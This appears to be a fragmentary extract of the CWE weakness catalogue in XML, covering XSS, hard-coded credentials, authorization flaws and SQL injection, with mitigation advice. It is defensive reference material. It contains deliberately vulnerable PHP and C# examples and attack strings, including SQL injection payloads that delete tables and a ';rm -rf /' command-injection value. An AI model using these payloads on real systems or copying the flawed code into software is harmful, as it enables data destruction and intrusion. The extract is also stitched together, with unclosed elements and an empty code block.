               <Note>The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running "Active X" controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.</Note>

               <Effectiveness_Notes>With Stored XSS, the indirection caused by the data store can make it more difficult to find the problem. The tester must first inject the XSS string into the data store, then find the appropriate application functionality in which the XSS string is sent to other users of the application. These are two distinct steps in which the activation of the XSS can take place minutes, hours, or days after the XSS was originally injected into the data store.</Effectiveness_Notes>

               <Description>
                  <xhtml:p>Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.</xhtml:p>
                  <xhtml:p>The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.</xhtml:p>

               <Description>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</Description>

               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When dynamically constructing web pages, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.</xhtml:p>
                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon ("&lt;3") would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the "&lt;" character, which would need to be escaped or otherwise handled. In this case, stripping the "&lt;" might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities.</xhtml:p>
                  <xhtml:p>Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</xhtml:p>
                  <xhtml:p>Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.</xhtml:p>

               <Intro_Text>The following example consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing active users currently logged in. It also displays a Stored XSS (Type 2) scenario.</Intro_Text>
               <Body_Text>CreateUser.php</Body_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$username = mysql_real_escape_string($username);<xhtml:br/>$fullName = mysql_real_escape_string($fullName);<xhtml:br/>$query = sprintf('Insert Into users (username,password) Values ("%s","%s","%s")', $username, crypt($password),$fullName) ;<xhtml:br/>mysql_query($query);<xhtml:br/>/.../</xhtml:div>
               </Example_Code>
               <Body_Text>The code is careful to avoid a SQL injection attack (CWE-89) but does not stop valid HTML from being stored in the database. This can be exploited later when ListUsers.php retrieves the information:</Body_Text>
               <Body_Text>ListUsers.php</Body_Text>
               <Example_Code Nature="bad">
                  <xhtml:div>$query = 'Select * From users Where loggedIn=true';<xhtml:br/>$results = mysql_query($query);<xhtml:br/>if (!$results) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>exit;</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:div>
                        <xhtml:i>//Print list of users to page</xhtml:i>
                     </xhtml:div>
                     <xhtml:br/>echo '&lt;div id="userlist"&gt;Currently Active Users:';<xhtml:br/>while ($row = mysql_fetch_assoc($results)) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>echo '&lt;div class="userNames"&gt;'.$row['fullname'].'&lt;/div&gt;';</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:br/>echo '&lt;/div&gt;';</xhtml:div>
               </Example_Code>
               <Body_Text>The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Active Users page. This HTML can, for example, be a password stealing Login message.</Body_Text>

      <Weakness ID="798" Name="Use of Hard-coded Credentials" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software contains hard-coded credentials, such as a password or cryptographic key, which it uses for its own inbound authentication, outbound communication to external components, or encryption of internal data.</Description>
         <Extended_Description>
            <xhtml:p>Hard-coded credentials typically create a significant hole that allows an attacker to bypass the authentication that has been configured by the software administrator. This hole might be difficult for the system administrator to detect. Even if detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div>Inbound: the software contains an authentication mechanism that checks the input credentials against a hard-coded set of credentials.</xhtml:div>
               <xhtml:div>Outbound: the software connects to another system or component, and it contains hard-coded credentials for connecting to that component.</xhtml:div>
            </xhtml:div>
            <xhtml:p>In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the software. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the software will have the same password, even across different organizations, this enables massive attacks such as worms to take place.</xhtml:p>
            <xhtml:p>The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end software. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.</xhtml:p>

               <Description>Automated white box techniques have been published for detecting hard-coded credentials for incoming authentication, but there is some expert disagreement regarding their effectiveness and applicability to a broad range of methods.</Description>

               <Method>Manual Static Analysis</Method>
               <Description>This weakness may be detectable using manual code analysis. Unless authentication is decentralized and applied throughout the software, there can be sufficient time for the analyst to find incoming authentication routines and examine the program logic looking for usage of hard-coded credentials. Configuration files could also be analyzed.</Description>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>

               <Method>Manual Dynamic Analysis</Method>
               <Description>
                  <xhtml:p>For hard-coded credentials in incoming authentication: use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and perform a login. Using call trees or similar artifacts from the output, examine the associated behaviors and see if any of them appear to be comparing the input to a fixed string or value.</xhtml:p>

                  <xhtml:p>For inbound authentication using passwords: apply strong one-way hashes to passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When handling an incoming password during authentication, take the hash of the password and compare it to the saved hash.</xhtml:p>
                  <xhtml:p>Use randomly assigned salts for each separate hash that is generated. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.</xhtml:p>

This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user "scott" with a password of "tiger" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:</Body_Text>

      <Weakness ID="807" Name="Reliance on Untrusted Inputs in a Security Decision" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The application uses a protection mechanism that relies on the existence or values of an input, but the input can be modified by an untrusted actor in a way that bypasses the protection mechanism.</Description>
         <Extended_Description>
            <xhtml:p>Developers may assume that inputs such as cookies, environment variables, and hidden form fields cannot be modified. However, an attacker could change these inputs using customized clients or other attacks. This change might not be detected. When security decisions such as authentication and authorization are made based on the values of these inputs, attackers can bypass the security of the software.</xhtml:p>
            <xhtml:p>Without sufficient encryption, integrity checking, or other mechanism, any input that originates from an outsider cannot be trusted.</xhtml:p>

               <Body_Text>IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication.</Body_Text>

                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>

               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>

               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>

               <Description>
                  <xhtml:p>Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.</xhtml:p>
                  <xhtml:p>This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.</xhtml:p>

Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>
                  <xhtml:p>Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.</xhtml:p>

               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>

      <Weakness ID="830" Name="Inclusion of Web Functionality from an Untrusted Source" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software includes web functionality (such as a web widget) from another domain, which causes it to operate within the domain of the software, potentially granting total access and control of the software to the untrusted source.</Description>
         <Extended_Description>
            <xhtml:p>Including third party functionality in a web-based environment is risky, especially if the source of the functionality is untrusted.</xhtml:p>
            <xhtml:p>Even if the third party is a trusted source, the software may still be exposed to attacks and malicious behavior if that trusted source is compromised, or if the code is modified in transmission from the third party to the software.</xhtml:p>
            <xhtml:p>This weakness is common in "mashup" development on the web, which may include source functionality from other domains. For example, Javascript-based web widgets may be inserted by using '&lt;SCRIPT SRC="http://other.domain.here"&gt;' tags, which causes the code to run in the domain of the software, not the remote site from which the widget was loaded. As a result, the included code has access to the local DOM, including cookies and other data that the developer might not want the remote site to be able to access.</xhtml:p>
            <xhtml:p>Such dependencies may be desirable, or even required, but sometimes programmers are not aware that a dependency exists.</xhtml:p>

      <Weakness ID="836" Name="Use of Password Hash Instead of Password for Authentication" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software records password hashes in a data store, receives a hash of a password from a client, and compares the supplied hash to the hash obtained from the data store.</Description>
         <Extended_Description>
            <xhtml:p>Some authentication mechanisms rely on the client to generate the hash for a password, possibly to reduce load on the server or avoid sending the password across the network. However, when the client is used to generate the hash, an attacker can bypass the authentication by obtaining a copy of the hash, e.g. by using SQL injection to compromise a database of authentication credentials, or by exploiting an information exposure. The attacker could then use a modified client to replay the stolen hash without having knowledge of the original password.</xhtml:p>
            <xhtml:p>As a result, the server-side comparison against a client-side hash does not provide any more security than the use of passwords without hashing.</xhtml:p>

      <Weakness ID="841" Name="Improper Enforcement of Behavioral Workflow" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software supports a session in which more than one behavior must be performed by an actor, but it does not properly ensure that the actor performs the behaviors in the required sequence.</Description>
         <Extended_Description>
            <xhtml:p>By performing actions in an unexpected order, or by omitting steps, an attacker could manipulate the business logic of the software or cause it to enter an invalid state. In some cases, this can also expose resultant weaknesses.</xhtml:p>
            <xhtml:p>For example, a file-sharing protocol might require that an actor perform separate steps to provide a username, then a password, before being able to transfer files. If the file-sharing server accepts a password command followed by a transfer command, without any username being provided, the software might still perform the transfer.</xhtml:p>
            <xhtml:p>Note that this is different than CWE-696, which focuses on when the software performs actions in the wrong sequence; this entry is closely related, but it is focused on ensuring that the actor performs actions in the correct sequence.</xhtml:p>

               <xhtml:p>This weakness is typically associated with business logic flaws, except when it produces resultant weaknesses.</xhtml:p>
               <xhtml:p>The classification of business logic flaws has been under-studied, although exploitation of business flaws frequently happens in real-world systems, and many applied vulnerability researchers investigate them. The greatest focus is in web applications. There is debate within the community about whether these problems represent particularly new concepts, or if they are variations of well-known principles.</xhtml:p>
               <xhtml:p>Many business logic flaws appear to be oriented toward business processes, application flows, and sequences of behaviors, which are not as well-represented in CWE as weaknesses related to input validation, memory management, etc.</xhtml:p>

         <Background_Details>
            <Background_Detail>An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.</Background_Detail>

It is also distinct from "AuthC," which is an abbreviation of "authentication." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>

               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.</xhtml:p>

      </Weakness>
      <Weakness ID="863" Name="Incorrect Authorization" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The software performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check. This allows attackers to bypass intended access restrictions.</Description>
         <Extended_Description>
            <xhtml:p>Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.</xhtml:p>
            <xhtml:p>When access control checks are incorrectly applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.</xhtml:p>

         <Background_Details>
            <Background_Detail>An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.</Background_Detail>

               <Description>"AuthZ" is typically used as an abbreviation of "authorization" within the web application security community. It is also distinct from "AuthC," which is an abbreviation of "authentication." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>

                  <xhtml:p>Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.</xhtml:p>
                  <xhtml:p>Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.</xhtml:p>

               <Description>Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].</Description>

               <Body_Text>The programmer expects that the cookie will only be set when getRole() succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie. However, the attacker can easily set the "role" cookie to the value "Reader". As a result, the $role variable is "Reader", and getRole() is never invoked. The attacker has bypassed the authorization system.</Body_Text>

Perform input validation at well-defined interfaces.</Description>

               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

               <Description>Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.</Description>

               <Description>
                  <xhtml:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.</xhtml:p>
                  <xhtml:p>Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.</xhtml:p>

               <Intro_Text>The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.</Intro_Text>
               <Example_Code Nature="bad" Language="C">

               </Example_Code>
               <Body_Text>Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form ";rm -rf /", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.</Body_Text>
               <Body_Text>Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120).</Body_Text>

      <Weakness ID="89" Name="Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.</xhtml:p>
            <xhtml:p>SQL injection has become a common issue with database-driven web sites. The flaw is easily detected, and easily exploited, and as such, any site or software package with even a minimal user base is likely to be subject to an attempted attack of this kind. This flaw depends on the fact that SQL makes no real distinction between the control and data planes.</xhtml:p>

That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</xhtml:p>
                  <xhtml:p>Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.</xhtml:p>

               <Description>
                  <xhtml:p>While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).</xhtml:p>
                  <xhtml:p>Instead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection.

               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When constructing SQL query strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.</xhtml:p>
                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name "O'Reilly" would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the "'" apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded.</xhtml:p>
                  <xhtml:p>When feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes.</xhtml:p>

         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In 2008, a large number of web servers were compromised using the same SQL injection attack string. This single string worked against many different programs. The SQL injection was then used to modify the web sites to serve malicious code.</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user.</Intro_Text>
               <Example_Code Nature="bad" Language="C#">
                  <xhtml:div>...<xhtml:br/>string userName = ctx.getAuthenticatedUserName();<xhtml:br/>string query = "SELECT * FROM items WHERE owner = '" + userName + "' AND itemname = '" + ItemName.Text + "'";<xhtml:br/>sda = new SqlDataAdapter(query, conn);<xhtml:br/>DataTable dt = new DataTable();<xhtml:br/>sda.Fill(dt);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The query that this code intends to execute follows:</Body_Text>
               <Example_Code Nature="informative">
                  <xhtml:div>SELECT * FROM items WHERE owner = &lt;userName&gt; AND itemname = &lt;itemName&gt;;</xhtml:div>
               </Example_Code>
               <Body_Text>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>name' OR 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>for itemName, then the query becomes the following:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';</xhtml:div>
               </Example_Code>
               <Body_Text>The addition of the:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>OR 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>condition causes the WHERE clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>SELECT * FROM items;</xhtml:div>
               </Example_Code>
               <Body_Text>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example examines the effects of a different malicious value passed to the query constructed and executed in the previous example.</Intro_Text>
               <Body_Text>If an attacker with the user name wiley enters the string:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>name'; DELETE FROM items; --</xhtml:div>
               </Example_Code>
               <Body_Text>for itemName, then the query becomes the following two queries:</Body_Text>
               <Example_Code Nature="attack" Language="SQL">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';<xhtml:br/>DELETE FROM items;<xhtml:div>
                        <xhtml:i>--'</xhtml:i>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.</Body_Text>
               <Body_Text>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in the previous example.</Body_Text>
               <Body_Text>If an attacker enters the string</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>name'; DELETE FROM items; SELECT * FROM items WHERE 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>Then the following three valid statements will be created:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';<xhtml:br/>DELETE FROM items;<xhtml:br/>SELECT * FROM items WHERE 'a'='a';</xhtml:div>
               </Example_Code>
               <Body_Text>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:</Body_Text>
               <Body_Text>
                  <xhtml:ul>
                     <xhtml:li>
                        <xhtml:div>Target fields that are not quoted</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>Find ways to bypass the need for certain escaped meta-characters</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>Use stored procedures to hide the injected meta-characters.</xhtml:div>
                     </xhtml:li>
